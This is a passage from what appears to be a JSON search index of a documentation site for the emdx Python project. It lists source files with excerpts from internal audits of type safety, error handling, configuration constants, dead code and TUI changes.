Section: Overview</p> <p>The <code>UnifiedExecutor</code> (<code>emdx/services/unified_executor.py</code>) is the core execution engine for EMDX's delegate system. It provides a unified interface for executing AI agent tasks with different CLI backends (Claude, Cursor),...</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/emdxservicesunifiedexecutorpy/#emdxservicesunified_executorpy_1","title":"<code>emdx/services/unified_executor.py</code>","text":""},{"location":"entities/emdxservicesunifiedexecutorpy/#im","title":"Im","text":"<p>Section: Changes Made</p> <ul> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: 2. Retryable Error Detection</p> <p>File: <code>emdx/services/unified_executor.py</code></p> </li> <li> <p>#6494 None Type Analysis [5/7]   Section: None Type Analysis: Executor/CLI Service Files</p> </li> <li><code>emdx/services/unified_executor.py</code></li> <li><code>emdx/services/cli_executor/base.py</code></li> <li><code>emdx/services/claude_executor.py</code></li> <li><code>emdx/services/cli_executor/cursor.py</code></li> <li><code>emdx/services/cli_executor/claude.py</code></li> <li> <p>`emd...</p> </li> <li> <p>#6492 None Type Analysis [5/7]   Section: Conclusion</p> </li> <li><code>emdx/services/unified_executor.py</code> - 9 occurrences, all necessary</li> <li><code>emdx/services/cli_executor/base.py</code> - 4 occurrences, all necessary</li> <li> <p><code>emdx/services/claude_executor.py</code> - 8 occurrences, all nec...</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> <p>...SECONDS</p> </li> <li><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li><code>emdx/services/execution_monitor.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/cli_executor/claude.py</code> - Uses CLI_VER...</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...EFAULT_TIMEOUT | | <code>emdx/commands/cascade.py</code> | Use STAGE_*_TIMEOUT constants | | <code>emdx/services/unified_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT | | <code>emdx/services/ask_service.py</code> | Use DEFAULT_CLAUDE_SONNET_MODEL | | <code>emdx/config/cli_config.py</code> | Use DEFAULT_CLAUDE_MODEL, DEFA...</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>...<code>emdx/commands/status.py</code></p> </li> <li><code>emdx/commands/tags.py</code></li> <li><code>emdx/commands/trash.py</code></li> <li><code>emdx/services/unified_executor.py</code></li> <li><code>emdx/services/cascade_service.py</code></li> <li> <p><code>emdx/services/execution_monitor.py</code></p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...S</p> </li> <li><code>emdx/services/execution_monitor.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li> <p><code>emdx/utils/environment.py</code> - Uses ENV_*, VERSION_CHECK_TIMEOUT_SECONDS, AUTH_CHECK_TIMEOUT_SECONDS</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...import: <code>annotations</code></p> </li> <li><code>emdx/services/tag_service.py:7</code> - 4 unused re-exports</li> <li> <p><code>emdx/services/unified_executor.py:19</code> - unused imports: <code>CliTool</code>, <code>get_default_cli_tool</code></p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Could use TypedDict or more specific types</p> File:Line Issue <code>emdx/services/unified_executor.py:171</code> <code>to_dict() -&gt; Dict[str, Any]</code> - Could define TypedDict for ExecutionResult <code>emdx/services/duplicate_detector.py:109,345,371,431,463</code> Multiple `Dict[str,... </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 2. Bare <code>except Exception:</code> Without Variable (3 instances)</p> File Line Issue <code>emdx/services/unified_executor.py</code> 465 Metrics persistence failure logged at debug level only <code>emdx/__init__.py</code> 23-25 Version dev suffix generation swallows all errors `emdx/utils/lo... </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe0 HIGH: Overly Broad Exception Catches</p> <p>...g_utils.py<code>| 110 | Logging setup catches all exceptions - should be specific | |</code>emdx/services/unified_executor.py<code>| 465-466 | Execution metrics persistence - logs but too broad | |</code>emdx/services/unified_search.py` | 585-586 | Embedding check catches all - should catch sqlite3....</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Code Locations Summary</p> <p>...mmands/delegate.py<code>| 1-705 | Creates tasks + executions | | Execution creation |</code>emdx/services/unified_executor.py<code>| 231-236 | DB insert for executions | | Activity query |</code>emdx/services/execution_service.py<code>| 30-61 | SQL to fetch delegate executions | | Activity loading |</code>em...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/services/unified_executor.py \u2014 6 changes</li> </ol> </li> <li>Removed \"Cursor\" from module docstring</li> <li> <p>Changed \"Works with both Claude and Cursor output formats\" \u2192 \"Works with Claude stream-json output for...</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...s/delegate.py** - Uses DELEGATE_TIMEOUT_SECONDS and DISCOVERY_TIMEOUT_SECONDS</p> </li> <li>emdx/services/unified_executor.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li>emdx/services/cascade_service.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT_SECONDS</li> <li>**emdx/commands...</li> </ul>"},{"location":"entities/emdxservicesunifiedexecutorpy/#1-emdxservicesunified_executorpy","title":"1. <code>emdx/services/unified_executor.py</code>","text":"<ul> <li>Added <code>is_retryable_error()</code> function to classify errors as retryable or not:</li> <li>Retryable: Timeout, rate limit (429), \"too many requests\", Claude CLI rate e...</li> </ul>"},{"location":"entities/emdxservicesunifiedexecutorpy/#analysis-scope","title":"Analysis Scope","text":"<p>Files analyzed:</p>"},{"location":"entities/emdxservicesunifiedexecutorpy/#files-analyzed","title":"Files Analyzed","text":""},{"location":"entities/emdxservicesunifiedexecutorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.0)</li> <li><code>emdx/services/cli_executor/base.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.0)</li> <li><code>emdx/services/execution_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>`emdx/services/unified_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>executionresultdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> <li><code>cli_tool</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/emdxservicesunifiedsearchpy/","title":"emdx/services/unified_search.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxservicesunifiedsearchpy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4] <p>The event is always a <code>FileSystemEvent</code> from watchdog. ---</p> </li> </ul>"},{"location":"entities/emdxservicesunifiedsearchpy/#emdxservicesunified_searchpy_1","title":"emdx/services/unified_search.py","text":""},{"location":"entities/emdxservicesunifiedsearchpy/#3-unifiedsearchservice_embedding_service-any-none","title":"3. <code>UnifiedSearchService._embedding_service: Any = None</code>","text":"<ul> <li>Location: Line 67</li> <li>Current Type: <code>Any</code></li> <li> <p>Actual Type: `EmbeddingService | None...</p> </li> <li> <p>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made</p> <p>.../ask_service.py` \u2014 Replaced normalize_tag_to_emoji with simple .strip().lower()</p> </li> <li> <p><code>emdx/services/unified_search.py</code> \u2014 Removed lazy import of normalize_tag_to_emoji</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 4. <code>normalize_tag_to_emoji</code> (function)</p> <p>...rvices/ask_service.py<code>| 217 | **Usage**: Normalize tag filters in AskService | |</code>emdx/services/unified_search.py<code>| 569 | **Import** (inline):</code>from ..utils.emoji_aliases import normalize_tag_to_emoji<code>| |</code>emdx/services/unified_search.py` | 571 | Usage: Normalize tags in s...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Implementation Plan</p> <p>.... Update <code>emdx/services/auto_tagger.py</code> \u2014 remove <code>EMOJI_ALIASES</code> lookup</p> </li> <li>Update <code>emdx/services/unified_search.py</code> \u2014 remove <code>normalize_tag_to_emoji()</code> call</li> <li> <p>Update <code>emdx/services/ask_service.py</code> \u2014 remove <code>normalize_tag_to_emoji()</code> call</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts</p> <p><code>emdx/commands/distill.py</code></p> </li> </ul> <p>Changes: - Added <code>TYPE_CHECKING</code> guard for <code>Audience</code> import - Created <code>DistillDocumentDict</code> TypedDict for document data:   - <code>id: int</code>, <code>title: str</code>, <code>content: str</code> - Updated function signatures:   - `_get_documents_b...</p> <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority </li> <li><code>emdx/services/unified_search.py</code> (line 364: <code>list[Any]</code> \u2192 <code>list[SemanticMatch]</code>)</li> <li><code>emdx/services/embedding_service.py</code> (line 30: <code>-&gt; Any</code> \u2192 <code>-&gt; SentenceTransformer</code>)</li> <li> <p>`emdx/ui/activity/activity_i...</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: Summary</p> <p>...ations in four services files:</p> </li> <li><code>emdx/services/ask_service.py</code> - 6 occurrences</li> <li><code>emdx/services/unified_search.py</code> - 4 occurrences</li> <li><code>emdx/services/file_watcher.py</code> - 2 occurrences</li> <li> <p><code>emdx/services/embedding_service.py</code> - 2 occurrences</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]</p> <p>Line 193: Fallback Params List</p> </li> </ul> <pre><code>fallback_params: list[Any] = []\n</code></pre> <p>Recommended Type:</p> <pre><code>fallback_params: list[str | int] = []\n</code></pre> <p>Why: Same reasoning - SQL params for project filter and limit. ---</p>"},{"location":"entities/emdxservicesunifiedsearchpy/#must-fix-breaks-type-safety","title":"Must Fix (breaks type safety)","text":""},{"location":"entities/emdxservicesunifiedsearchpy/#file-emdxservicesu","title":"File: `emdx/services/u...","text":"<ul> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...ly ignored | | <code>emdx/ui/modals.py</code> | 384-385 | Preview write silently ignored | | <code>emdx/services/unified_search.py</code> | 585-586 | Returns False on any DB error |</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe0 HIGH: Overly Broad Exception Catches</p> <p>...d_executor.py<code>| 465-466 | Execution metrics persistence - logs but too broad | |</code>emdx/services/unified_search.py` | 585-586 | Embedding check catches all - should catch sqlite3.Error |</p> </li> </ul>"},{"location":"entities/emdxservicesunifiedsearchpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>phase 1: database migration</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>\ud83d\udfe2\u2192active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testsuggestaliases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tests/test_models_tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testreversealiases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testnormalizetagtoemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testistextalias</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testisemojitag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testgetcategoryemojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/emdxui/","title":"emdx/ui/","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-01-13</p>"},{"location":"entities/emdxui/#documents-10","title":"Documents (10)","text":"<ul> <li>#6583 Delegate synthesis [synthesis] </li> </ul>"},{"location":"entities/emdxui/#type-safety-audit-synthesis-emdxservices-emdxui-and-tests","title":"Type Safety Audit Synthesis: <code>emdx/services/</code>, <code>emdx/ui/</code>, and <code>tests/</code>","text":""},{"location":"entities/emdxui/#overview","title":"Overview","text":"<p>Three parallel audits examined the codebase for type safety gaps. The findings paint a consistent picture: **the production code has moderate <code>Any</code> usage that's m...</p> <ul> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Summary</p> <p>Audited all 40+ Python files in <code>emdx/ui/</code>. Found 21 distinct fixable <code>Any</code> usages across 14 files. Several are already correctly typed (Textual <code>*args: Any, **kwargs: Any</code> convention) and should be left alone per CLAUDE.md exceptions.</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: Priority 1: Create Protocols (High Impact)</p> <p>Create a <code>protocols.py</code> file in <code>emdx/ui/</code> with:</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: Executive Summary</p> <p>The <code>emdx/ui/</code> module has 67 occurrences of <code>Any</code> across 19 files. Most are in high-traffic paths \u2014 presenter classes, activity items, and the browser container. This audit categorizes them by impact and proposes concrete replacements.</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: Module-Specific Summaries</p> </li> <li>21 issues (3 critical, 5 medium)</li> <li> <p>Primary concerns: race conditions, timer cleanup, accessibility</p> </li> <li> <p>#6328 Delegate: Analyze emdx/ui/ for architecture improvements. Focus on: (1 [3/10]   Section: Executive Summary</p> <p>The <code>emdx/ui/</code> directory contains approximately 50 files implementing a Textual-based TUI. The architecture has evolved organically with some good patterns (presenters, mixins, vi...</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe1 Medium Priority Issues</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]   Section: TUI Dead Code Audit Report</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Contradictions Resolved</p> <p>...Component Count | \"70+ components\" (Analysis A) vs unspecified | Confirmed 70+ in <code>emdx/ui/</code> directory | | Line Count | Only Analysis D specified (~48,600) | Accepted as definitive count |</p> </li> </ul>"},{"location":"entities/emdxui/#ui-emdxui","title":"UI (<code>emdx/ui/</code>)","text":""},{"location":"entities/emdxui/#11-todos-not-addressed","title":"11. TODOs Not Addressed","text":"<p>Location: <code>emdx/ui/search/search_screen.py:474,479</code> Impact: Incomplete features</p>"},{"location":"entities/emdxui/#summary","title":"Summary","text":"<p>Audit of <code>emdx/ui/</code> for dead code related to removed WorkflowItem, MailItem, IndividualRunItem, SynthesisItem, ExplorationItem, and other legacy artifacts.</p>"},{"location":"entities/emdxui/#related-entities","title":"Related Entities","text":"<ul> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdxuiactivityactivitydatapy/","title":"emdx/ui/activity/activity_data.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxuiactivityactivitydatapy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6840 Delegate: TUI-24 (Issue #1241): Update TUI browser with doc_type badge [2/2]   Section: What was done (Issue #1241): <p>...ged:</p> </li> <li><code>emdx/ui/activity/activity_items.py</code> \u2014 Added <code>doc_type</code> field, wiki icon</li> <li><code>emdx/ui/activity/activity_data.py</code> \u2014 Added <code>doc_type_filter</code> parameter</li> <li><code>emdx/ui/activity/activity_table.py</code> \u2014 Wiki badge in title column</li> <li> <p><code>emdx/ui/activity/activity_view.py</code> \u2014 Filter reactive, <code>w</code>...</p> </li> <li> <p>#6750 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/emdxuiactivityactivitydatapy/#un-12","title":"Un [1/2]","text":"<p>Section: What was implemented:</p> <p>2. <code>emdx/ui/activity/activity_data.py</code> \u2014 Extended data loader - Added <code>_load_tasks()</code> method fetching ready + active + recently completed tasks - Deduplication: Tasks with <code>execution_id</code> matching a...</p> <ul> <li>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers <p>...dx/services/cascade_service.py` - ProcessLookupError on already-exited process</p> </li> <li><code>emdx/ui/activity/activity_data.py</code> - ImportError for optional services</li> <li><code>emdx/ui/activity/activity_items.py</code> - Added logger, debug logging for load failures</li> <li> <p><code>emdx/ui/cascade/document_list.py</code> -...</p> </li> <li> <p>#6355 Delegate: Document #6349 (Service Layer &amp; Cascade Refactor Plan): Implementation Complete   Section: Audit Results</p> </li> <li> <p><code>emdx/ui/activity/activity_data.py:194-213</code>: Orphaned cascade executions query</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: activity_data.py - Loading Agent Executions</p> <p>Location: <code>emdx/ui/activity/activity_data.py:244-302</code></p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 5. list_non_workflow_documents \u2014 DEAD CODE (4 hits)</p> <p>File: <code>emdx/ui/activity/activity_data.py</code></p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> <p>...activity/activity_view.py<code>| Mission Control \u2014 shows agents, cascades, groups | |</code>emdx/ui/activity/activity_data.py<code>| Data loader \u2014 loads groups, docs, cascades, agents (NOT tasks) | |</code>emdx/commands/tasks.py<code>| CLI commands for task management | |</code>emdx/models/tasks.py` | Task C...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/ui/activity/activity_data.py \u2014 1 change</li> </ol> </li> <li>Removed <code>\"cursor\"</code> log file detection logic</li> </ul>"},{"location":"entities/emdxuiactivityactivitydatapy/#raw-sql-in-ui-files","title":"Raw SQL in UI Files","text":"<p>Found 1 raw SQL query in UI layer:</p>"},{"location":"entities/emdxuiactivityactivitydatapy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/activity/activity_table.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>activity browser</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/ui/activity_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>_load_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx/ui/activity/activity_items.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> <li><code>get_preview_content()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>activitydataloader</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>emdx/commands/tasks.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>emdx/services/cascade_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> <li><code>emdx/ui/activity/activity_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.1)</li> </ul>"},{"location":"entities/emdxuiactivityactivityitemspy/","title":"emdx/ui/activity/activity_items.py","text":"<p>Type: tech_term | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxuiactivityactivityitemspy/#documents-16","title":"Documents (16)","text":"<ul> <li>#6840 Delegate: TUI-24 (Issue #1241): Update TUI browser with doc_type badge [2/2]   Section: What was done (Issue #1241): </li> <li><code>emdx/ui/activity/activity_items.py</code> \u2014 Added <code>doc_type</code> field, wiki icon</li> <li><code>emdx/ui/activity/activity_data.py</code> \u2014 Added <code>doc_type_filter</code> parameter</li> <li> <p><code>emdx/ui/activity/activity_table.py</code> \u2014 Wiki badge in...</p> </li> <li> <p>#6757 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/emdxuiactivityactivityitemspy/#files-changed","title":"Files changed:","text":""},{"location":"entities/emdxuiactivityactivityitemspy/#un-22","title":"Un [2/2]","text":"<p>Section: Phase 2 of Unified Dashboard Data Model (Issue #6709)</p> <ol> <li><code>emdx/ui/activity/activity_items.py</code> \u2014 Added <code>TaskItem(ActivityItem)</code> subclass with:</li> <li><code>item_type = \"task\"</code>, status-based icons (\u25cb \u25cf \u26a0 \u2713 \u2717)</li> <li><code>get_preview_content()</code> showing title, status, prio...</li> </ol> <ul> <li>#6750 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</li> </ul>"},{"location":"entities/emdxuiactivityactivityitemspy/#un-12","title":"Un [1/2]","text":"<p>Section: What was implemented:</p> <p>1. <code>emdx/ui/activity/activity_items.py</code> \u2014 TaskItem subclass - Added <code>TaskItem(ActivityItem)</code> with <code>item_type = \"task\"</code> - Plain text status icons: <code>v</code> (done), <code>&gt;</code> (active), <code>.</code> (open), <code>x</code> (failed), <code>-</code>...</p> <ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...screen.py<code>| 283, 285, 287, 289, 299-305 | \ud83e\udde0\ud83c\udff7\ufe0f\ud83d\udd0d\ud83d\udcdd | Search result source icons | |</code>emdx/ui/activity/activity_items.py<code>| 84, 162-166, 172, 218, 298-299 | \u2705\ud83d\udccb\ud83c\udff7\ufe0f\ud83d\udcca\ud83d\udcdd\u274c | Activity view status icons | |</code>emdx/ui/activity/activity_view.py` | 423, 576, 744, 764 | \u26a0\ufe0f\ud83d\udccb\ud83d\udcdd | Activity view display...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: Files Changed</p> <ol> <li><code>emdx/ui/types.py</code> (NEW)</li> </ol> </li> <li><code>emdx/ui/activity/activity_items.py</code> (MODIFIED)</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> (MODIFIED)</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority</p> <p>...x/services/embedding_service.py<code>(line 30:</code>-&gt; Any<code>\u2192</code>-&gt; SentenceTransformer`)</p> </li> <li><code>emdx/ui/activity/activity_items.py</code> (8 occurrences)</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> (12 occurrences)</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]</p> <p>For each occurrence, I provide the current signature, recommended replacement type, and rationale. ---</p> </li> </ul>"},{"location":"entities/emdxuiactivityactivityitemspy/#file-emdxuiactivityactivity_itemspy","title":"File: <code>emdx/ui/activity/activity_items.py</code>","text":""},{"location":"entities/emdxuiactivityactivityitemspy/#1-line-51-load_children-method-parameter","title":"1. Line 51: <code>load_children</code> method parameter","text":"<p>Current: ```python async def load_children(se...</p> <ul> <li>#6488 Any Type Removal Analysis [1/5] </li> </ul> <p>Analysis of <code>Any</code> type annotations in EMDX UI Activity and Cascade files with specific replacement recommendations. ## Summary</p> File Any Count 